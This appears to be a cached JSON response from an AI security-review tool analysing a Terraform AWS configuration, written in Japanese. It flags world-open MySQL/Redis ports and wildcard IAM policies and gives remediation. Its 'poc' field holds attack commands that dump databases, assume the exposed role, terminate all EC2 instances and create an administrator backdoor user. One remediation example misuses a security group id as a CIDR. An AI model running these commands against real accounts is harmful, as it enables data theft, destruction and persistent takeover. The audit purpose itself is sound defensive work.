{
  "version": "1.0.0",
  "agent": "claude-code",
  "model": "claude-code",
  "prompt_hash": "a82ccaa0e8b63a4139dd7f560e9fad3a85940beee6f904e2271b4ea3861708da",
  "response": "{\"scratchpad\":\"Terraform IaC分析 - AWS セキュリティ設定のレビュー。\\n\\n【脅威モデル】\\n1. セキュリティグループの過度にオープンな設定\\n   - app_server: HTTP/HTTPS/App port (3000) が 0.0.0.0/0 に開放\\n   - database: MySQL (3306) が 0.0.0.0/0 に開放 - これは特に危険\\n   - cache: Redis (6379) が 0.0.0.0/0 に開放\\n\\n2. IAM権限の過度な付与\\n   - aws_iam_policy で Action=\\\"*\\\" Resource=\\\"*\\\" - 最高権限\\n   - assume_role_policy で Principal AWS=\\\"*\\\" - 任意のAWSアカウントがAssumeRole可能\\n\\n【PAR分析】\\nPrincipal: \\n- var.allowed_cidr (外部入力)\\n- var.project_name (外部入力)\\n- AWS IAM Principal (\\\"*\\\" = untrusted)\\n\\nAction:\\n- セキュリティグループのCIDR設定 (バリデーションなし)\\n- IAMポリシー (最小権限なし)\\n- IAMロールAssumeRole設定 (ワイルドカード許可)\\n\\nResource:\\n- AWS EC2インスタンス (HTTP/HTTPS/SSH/App port)\\n- RDSデータベース (MySQL)\\n- ElastiCache (Redis)\\n\\n【攻撃シナリオ】\\n1. SSRF/Network Access: 0.0.0.0/0からMySQL/Redisに直接アクセス可能\\n2. Privilege Escalation: IAM\\\"*\\\"権限でアカウント内リソースに無制限アクセス\\n3. Unauthorized Access: セキュリティグループがすべてのポートをオープン\",\"analysis\":\"この Terraform コードは複数の CRITICAL レベルのセキュリティ脆弱性を含んでいます。\\n\\n【1. セキュリティグループの設定ミス】\\n- app_server (3000番ポート): 0.0.0.0/0 から全アクセス許可\\n- database (3306番ポート MySQL): 0.0.0.0/0 から全アクセス許可 ★ 最も危険\\n- cache (6379番ポート Redis): 0.0.0.0/0 から全アクセス許可\\n\\nこれにより、インターネット上の誰でもこれらのサービスに直接接続可能になります。\\n\\n【2. IAMロールの過度な権限付与 (T1078 - Valid Accounts)】\\n- aws_iam_policy で \\\"Action\\\": \\\"*\\\" と \\\"Resource\\\": \\\"*\\\" を指定\\n  → アカウント内のすべての AWS リソースに対する操作が許可される\\n- 最小権限の原則に違反\\n\\n【3. IAMロールAssumeRoleポリシーの悪質な設定 (T1484 - Domain Policy Modification)】\\n- 119-127行: ec2.amazonaws.com のみ正当な設定\\n- 128-134行: \\\"Principal\\\": {\\\"AWS\\\": \\\"*\\\"} ← 任意の AWS アカウント/IAM ユーザーがこのロールをAssumeRole可能\\n  → クロスアカウント攻撃、外部攻撃者によるロール乗っ取りが可能\\n\\n【4. 統合的な攻撃経路】\\nPrincipal (任意のインターネットユーザー) → Action (Assume Role with \\\"*\\\" Principal) → Resource (EC2/DB/Cache への無制限アクセス)\",\"poc\":\"#!/bin/bash\\n# PoC: AWS セキュリティ脆弱性の悪用シナリオ\\n\\n# 1. セキュリティグループ経由での直接データベースアクセス\\n# インターネット上の任意の場所から実行可能\\nmysql -h <database-endpoint> -u admin -p -e \\\"SELECT * FROM users;\\\" 2>/dev/null\\n\\n# 2. Redisへの直接アクセス\\nredis-cli -h <cache-endpoint> -p 6379 KEYS \\\"*\\\" 2>/dev/null\\n\\n# 3. IAMロールのAssumeRole乗っ取り\\n# 外部AWSアカウント(または外部IAMユーザー)から実行\\naws sts assume-role \\\\\\n  --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<project_name>-app-role \\\\\\n  --role-session-name malicious-session \\\\\\n  --region us-east-1\\n\\n# 返されたクレデンシャルで、アカウント内のすべてのリソースに無制限アクセス\\nexport AWS_ACCESS_KEY_ID=<assumed_credentials>\\nexport AWS_SECRET_ACCESS_KEY=<assumed_credentials>\\nexport AWS_SESSION_TOKEN=<assumed_credentials>\\n\\n# すべてのS3バケット列挙\\naws s3 ls\\n\\n# すべてのEC2インスタンス停止/削除\\naws ec2 describe-instances --query 'Reservations[*].Instances[*].InstanceId' --output text | \\\\\\n  xargs -I {} aws ec2 terminate-instances --instance-ids {}\\n\\n# IAMユーザー作成（永続バックドア）\\naws iam create-user --user-name backdoor-user\\naws iam attach-user-policy --user-name backdoor-user \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\",\"confidence_score\":100,\"vulnerability_types\":[\"AFO\",\"T1078\",\"T1484\"],\"par_analysis\":{\"principals\":[{\"identifier\":\"Internet (0.0.0.0/0)\",\"trust_level\":\"untrusted\",\"source_context\":\"セキュリティグループの cidr_blocks = [\\\"0.0.0.0/0\\\"] で許可される全インターネットユーザー\",\"risk_factors\":[\"認証なしで MySQL/Redis に直接接続可能\",\"データベース認証がない場合、即座にデータ漏洩\",\"ポートスキャンで脆弱性発見が容易\"]},{\"identifier\":\"AWS Principal (*)\",\"trust_level\":\"untrusted\",\"source_context\":\"IAMロールの assume_role_policy で Principal AWS = \\\"*\\\" として許可\",\"risk_factors\":[\"任意の AWS アカウント/IAM ユーザーがロールをAssumeRole可能\",\"外部攻撃者のアカウントからもAssumeRole可能\",\"権限昇格と横展開のエントリーポイント\"]},{\"identifier\":\"var.allowed_cidr\",\"trust_level\":\"semi_trusted\",\"source_context\":\"Terraform 変数として外部入力される管理者CIDR\",\"risk_factors\":[\"CIDR 値の検証がない\",\"無効な CIDR (0.0.0.0/0) が渡される可能性\"]},{\"identifier\":\"var.project_name\",\"trust_level\":\"semi_trusted\",\"source_context\":\"Terraform 変数として外部入力されるプロジェクト名\",\"risk_factors\":[\"リソース名にそのまま使用される\",\"値の検証がない\"]}],\"actions\":[{\"identifier\":\"aws_security_group (app_server) - HTTP/HTTPS/App\",\"security_function\":\"ネットワークアクセス制御\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"cidr_blocks = [\\\"0.0.0.0/0\\\"] でグローバルオープン\",\"ソースIPのホワイトリストなし\",\"WAF や IP制限なし\"],\"bypass_vectors\":[\"インターネット上の任意の場所からのアクセス\",\"脆弱性スキャナー(Shodan等)での自動検出と悪用\"]},{\"identifier\":\"aws_security_group (database) - MySQL\",\"security_function\":\"ネットワークアクセス制御\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"cidr_blocks = [\\\"0.0.0.0/0\\\"] でグローバルオープン\",\"データベースが直接インターネット公開\",\"データベースレプリケーション/バックアップも露出\"],\"bypass_vectors\":[\"MySQL ブルートフォース攻撃\",\"デフォルトクレデンシャル悪用\",\"MySQL プロトコル脆弱性の悪用\"]},{\"identifier\":\"aws_security_group (cache) - Redis\",\"security_function\":\"ネットワークアクセス制御\",\"implementation_quality\":\"missing\",\"detected_weaknesses\":[\"cidr_blocks = [\\\"0.0.0.0/0\\\"] でグローバルオープン\",\"Redis はデフォルトで認証なし\",\"キャッシュデータ(セッション等)が露出\"],\"bypass_vectors\":[\"Redis KEYS コマンドでデータ列挙\",\"Redis FLUSHDB でサービス妨害\",\"キャッシュポイズニング攻撃\"]},{\"identifier\":\"aws_iam_role (app_role) - assume_role_policy\",\"security_function\":\"認証・認可制御\",\"implementation_quality\":\"bypassed\",\"detected_weaknesses\":[\"Principal: {AWS: \\\"*\\\"} で任意のAWSプリンシパルを許可\",\"クロスアカウント アクセス制御なし\",\"外部攻撃者アカウントのAssumeRole許可\"],\"bypass_vectors\":[\"外部 AWS アカウント作成後にAssumeRole\",\"IAM ユーザー作成後にAssumeRole\",\"STS GetCallerIdentity で検証回避\"]},{\"identifier\":\"aws_iam_policy (app_policy)\",\"security_function\":\"権限制御・最小権限の実装\",\"implementation_quality\":\"insufficient\",\"detected_weaknesses\":[\"Action: \\\"*\\\" ですべてのAWSサービス操作を許可\",\"Resource: \\\"*\\\" ですべてのリソースに対し操作可能\",\"権限分離・最小権限の原則に違反\",\"IAM, S3, EC2, RDS など全サービスへのアクセス\"],\"bypass_vectors\":[\"AssumeRole後の全権限操作\",\"IAM ポリシー変更による権限拡張\",\"リソース削除によるサービス妨害\"]}],\"resources\":[{\"identifier\":\"EC2 Application Server (port 3000)\",\"sensitivity_level\":\"high\",\"operation_type\":\"ネットワークサービス公開\",\"protection_mechanisms\":[\"セキュリティグループ (不十分: 0.0.0.0/0)\",\"アプリケーション認証 (Terraform では不明)\"]},{\"identifier\":\"RDS MySQL Database (port 3306)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"データベース直接公開\",\"protection_mechanisms\":[\"セキュリティグループ (不十分: 0.0.0.0/0)\",\"データベース認証 (Terraform では不明, 恐らく弱い)\"]},{\"identifier\":\"ElastiCache Redis (port 6379)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"キャッシュ直接公開\",\"protection_mechanisms\":[\"セキュリティグループ (不十分: 0.0.0.0/0)\",\"Redis AUTH (Terraform では未設定)\"]},{\"identifier\":\"IAM Role (app_role)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"権限管理・アカウント制御\",\"protection_mechanisms\":[\"AssumeRole制限 (存在しない: Principal=*)\",\"ポリシー制限 (存在しない: Action=*, Resource=*)\"]},{\"identifier\":\"AWS Account Resources (全リソース)\",\"sensitivity_level\":\"critical\",\"operation_type\":\"アカウント全体へのアクセス\",\"protection_mechanisms\":[\"IAM ポリシー制限 (完全に欠落)\",\"リソースベースのACL (当該ロール内では機能しない)\"]}],\"policy_violations\":[{\"rule_id\":\"SG-OPEN-DATABASE-PORT\",\"rule_description\":\"セキュリティグループでデータベースポート(3306)がグローバル公開されている\",\"violation_path\":\"Internet (0.0.0.0/0) → aws_security_group (database) cidr_blocks=[\\\"0.0.0.0/0\\\"] → RDS MySQL (port 3306)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SG-OPEN-CACHE-PORT\",\"rule_description\":\"セキュリティグループでRedisポート(6379)がグローバル公開されている\",\"violation_path\":\"Internet (0.0.0.0/0) → aws_security_group (cache) cidr_blocks=[\\\"0.0.0.0/0\\\"] → ElastiCache Redis (port 6379)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SG-OPEN-APP-PORT\",\"rule_description\":\"セキュリティグループでアプリケーションポート(3000)がグローバル公開されている\",\"violation_path\":\"Internet (0.0.0.0/0) → aws_security_group (app_server) cidr_blocks=[\\\"0.0.0.0/0\\\"] → EC2 Application (port 3000)\",\"severity\":\"high\",\"confidence\":1.0},{\"rule_id\":\"IAM-ASSUME-ROLE-WILDCARD\",\"rule_description\":\"IAMロールのAssumeRole制御が任意のAWSプリンシパル(*)を許可している - クロスアカウント攻撃可能\",\"violation_path\":\"AWS Principal (*) → aws_iam_role (app_role) assume_role_policy Principal=AWS:* → EC2/DB/Cache への操作\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"IAM-OVERPRIVILEGED-POLICY\",\"rule_description\":\"IAMポリシーで Action=\\\"*\\\" Resource=\\\"*\\\" が設定されている - アカウント内すべてのリソースに無制限アクセス\",\"violation_path\":\"AssumeRole後のプリンシパル → aws_iam_policy (app_policy) Action=\\\"*\\\" Resource=\\\"*\\\" → AWS全リソース(S3, IAM, EC2, RDS等)\",\"severity\":\"critical\",\"confidence\":1.0},{\"rule_id\":\"SG-NO-ADMIN-RESTRICTION\",\"rule_description\":\"セキュリティグループの管理ポート(22)が var.allowed_cidr に制限されているが、変数検証がない\",\"violation_path\":\"var.allowed_cidr (検証なし) → aws_security_group (app_server) ingress[SSH] → EC2 SSH (port 22)\",\"severity\":\"high\",\"confidence\":0.8}]},\"remediation_guidance\":{\"policy_enforcement\":[{\"component\":\"Security Group - Database\",\"required_improvement\":\"MySQL ポート(3306)をグローバル公開から制限\",\"specific_guidance\":\"cidr_blocks = [\\\"0.0.0.0/0\\\"] を削除し、アプリケーション層が存在する VPC/サブネット CIDR のみに限定。例: cidr_blocks = [aws_security_group.app_server.id] または特定の VPC CIDR のみ\",\"priority\":\"critical\"},{\"component\":\"Security Group - Cache\",\"required_improvement\":\"Redis ポート(6379)をグローバル公開から制限\",\"specific_guidance\":\"cidr_blocks = [\\\"0.0.0.0/0\\\"] を削除し、アプリケーションサーバーのセキュリティグループIDのみを参照。例: cidr_blocks = [] + source_security_group_id = aws_security_group.app_server.id\",\"priority\":\"critical\"},{\"component\":\"Security Group - App Server\",\"required_improvement\":\"アプリケーション(3000)と HTTP/HTTPS のアクセス制限\",\"specific_guidance\":\"本番環境では 0.0.0.0/0 を使用しない。ALB/CloudFront 経由でのアクセスに限定し、セキュリティグループで ALB/CloudFront のセキュリティグループのみ許可。または特定のIP範囲に限定\",\"priority\":\"high\"},{\"component\":\"IAM Role - Assume Role Policy\",\"required_improvement\":\"AssumeRole の Principal を限定\",\"specific_guidance\":\"Principal AWS = \\\"*\\\" を削除。代わりに:\\n1. 信頼する AWS アカウント ID のみ: Principal AWS = \\\"arn:aws:iam::<TRUSTED_ACCOUNT_ID>:root\\\"\\n2. 特定の IAM ロール/ユーザーのみ: Principal AWS = \\\"arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>\\\"\\n3. EC2 インスタンスプロファイル経由: 現在の設定(ec2.amazonaws.com)を維持し、ワイルドカード部分を削除\",\"priority\":\"critical\"},{\"component\":\"IAM Policy - Permissions\",\"required_improvement\":\"Action と Resource を最小権限に制限\",\"specific_guidance\":\"Action = \\\"*\\\" Resource = \\\"*\\\" を削除。アプリケーションに必要な最小限の権限を列挙。例:\\n- EC2: ec2:DescribeInstances, ec2:DescribeTags のみ\\n- S3: s3:GetObject, s3:PutObject の特定バケットのみ\\n- RDS: rds:DescribeDBInstances のみ (操作が必要な場合は限定的に)\\n例: \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": [\\\"ec2:Describe*\\\"], \\\"Resource\\\": \\\"*\\\"}, {\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": [\\\"s3:GetObject\\\"], \\\"Resource\\\": \\\"arn:aws:s3:::specific-bucket/*\\\"}]\",\"priority\":\"critical\"},{\"component\":\"Variables - Validation\",\"required_improvement\":\"入力変数 var.allowed_cidr の検証\",\"specific_guidance\":\"var.allowed_cidr に validation ブロックを追加して CIDR 形式と危険値(0.0.0.0/0 など)をチェック。例:\\nvalidation { condition = !contains([\\\"0.0.0.0/0\\\"], var.allowed_cidr) error_message = \\\"allowed_cidr cannot be 0.0.0.0/0\\\" }\",\"priority\":\"medium\"},{\"component\":\"Overall Architecture\",\"required_improvement\":\"多層セキュリティモデルの導入\",\"specific_guidance\":\"1. ALB/NLB を使用してアプリケーションを非公開に\\n2. VPC Endpoints で AWS サービスアクセスを内部化\\n3. NAT Gateway でアウトバウンドトラフィック制御\\n4. AWS Secrets Manager でデータベース認証情報管理\\n5. Redis AUTH 有効化\\n6. MySQL パスワード複雑性設定\\n7. CloudTrail/VPC Flow Logs で監視\",\"priority\":\"critical\"}]},\"file_path\":null,\"pattern_description\":null,\"matched_source_code\":null}",
  "metadata": {
    "created_at": "2025-12-30T17:23:47.876608Z",
    "last_accessed": "2025-12-30T17:23:47.876608Z",
    "access_count": 0,
    "prompt_size": 7403,
    "response_size": 14932
  }
}